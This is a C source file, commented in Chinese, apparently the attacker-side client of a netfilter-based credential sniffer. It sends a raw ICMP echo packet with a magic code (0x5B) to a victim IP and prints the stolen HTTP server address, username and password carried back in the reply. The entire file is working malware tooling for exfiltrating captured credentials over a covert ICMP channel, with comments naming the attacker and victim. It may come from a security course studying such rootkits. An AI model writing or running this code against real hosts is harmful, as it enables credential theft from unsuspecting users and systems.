#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>

#ifndef __USE_BSD
# define __USE_BSD		       /* We want the proper headers */
#endif
# include <netinet/ip.h>
#include <netinet/ip_icmp.h>

/* Function prototypes */
static unsigned short checksum(int numwords, unsigned short *buff);

int main(int argc, char *argv[])
{
     /* 发送的数据包 */
    unsigned char dgram[256];
    /* 接收的数据包 */  
    unsigned char recvbuff[256];
    struct ip *iphead = (struct ip *)dgram;
    struct icmp *icmphead = (struct icmp *)(dgram + sizeof(struct ip));
     /* 源地址 */
    struct sockaddr_in src;
     /* 目的地址 */
    struct sockaddr_in addr;
    /* 攻击者 */
    struct in_addr my_addr;
    /* 服务器 */
    struct in_addr serv_addr;
    socklen_t src_addr_size = sizeof(struct sockaddr_in);
    int icmp_sock = 0;
    /* 缓冲区 */
    int one = 1;
    /* 缓冲区的头部指针 */
    int *ptr_one = &one;

    /* 若没有传入两个参数：被攻击和攻击主机IP则直接退出 */ 
    if (argc < 3) {
	fprintf(stderr, "Usage:  %s remoteIP myIP\n", argv[0]);
	exit(1);
    }

    /* Get a socket */
    if ((icmp_sock = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0) {
	fprintf(stderr, "Couldn't open raw socket! %s\n",
		strerror(errno));
	exit(1);
    }

    // set the HDR_INCL option on the socket 
    if(setsockopt(icmp_sock, IPPROTO_IP, IP_HDRINCL,
		  ptr_one, sizeof(one)) < 0) {
	close(icmp_sock);
	fprintf(stderr, "Couldn't set HDRINCL option! %s\n",
	        strerror(errno));
	exit(1);
    }
    /* 将目的地址的协议簇设置为ipv4 */
    addr.sin_family = AF_INET;
    /* 受害ip */ 
    addr.sin_addr.s_addr = inet_addr(argv[1]);//dest ip
    
    my_addr.s_addr = inet_addr(argv[2]);//src ip
    
    memset(dgram, 0x00, 256);
    memset(recvbuff, 0x00, 256);
    
    // Fill in the IP fields first 
    iphead->ip_hl  = 5;
    iphead->ip_v   = 4;
    iphead->ip_tos = 0;
    iphead->ip_len = 64;
    iphead->ip_id  = (unsigned short)rand();
    iphead->ip_off = 0;
    iphead->ip_ttl = 128;
    iphead->ip_p   = IPPROTO_ICMP;
    iphead->ip_sum = 0;
    iphead->ip_src = my_addr;
    iphead->ip_dst = addr.sin_addr;
    
    /* Now fill in the ICMP fields */
    icmphead->icmp_type = ICMP_ECHO;
    icmphead->icmp_code = 0x5B;//watch_in()中判断的icmp_code一致 
	//44=8+4+16+16
    icmphead->icmp_cksum = checksum(44, (unsigned short *)icmphead);
    
    /* Finally, send the packet */
    fprintf(stdout, "Sending request...\n");
    if (sendto(icmp_sock, dgram, 64, 0, (struct sockaddr *)&addr,
	       sizeof(struct sockaddr)) < 0) {
	fprintf(stderr, "\nFailed sending request! %s\n",
		strerror(errno));
	return 0;
    }

    fprintf(stdout, "Waiting for reply...\n");
    if (recvfrom(icmp_sock, recvbuff, 256, 0, (struct sockaddr *)&src,
		 &src_addr_size) < 0) {
	fprintf(stdout, "Failed getting reply packet! %s\n",
		strerror(errno));
	close(icmp_sock);
	exit(1);
    }
    iphead = (struct ip *)recvbuff;
    icmphead = (struct icmp *)(recvbuff + sizeof(struct ip));

    /* 将获取到的包的icmp数据部分复制到serv_addr */
    memcpy(&serv_addr, ((char *)icmphead + 8),
    	   sizeof (struct in_addr));
    
    fprintf(stdout, "Stolen for http server %s:\n", inet_ntoa(serv_addr));
    fprintf(stdout, "Username:    %s\n",
	     (char *)((char *)icmphead + 12));//12=8+4
    fprintf(stdout, "Password:    %s\n",
	     (char *)((char *)icmphead + 28));
    
    close(icmp_sock);
    
    return 0;
}

/* Checksum-generation function. It appears that PING'ed machines don't
 * reply to PINGs with invalid (ie. empty) ICMP Checksum fields...
 * Fair enough I guess. */
static unsigned short checksum(int numwords, unsigned short *buff)
{
   unsigned long sum;
   
   for(sum = 0;numwords > 0;numwords--)
     sum += *buff++;   /* add next word, then increment pointer */
   
   sum = (sum >> 16) + (sum & 0xFFFF);
   sum += (sum >> 16);
   
   return ~sum;
}
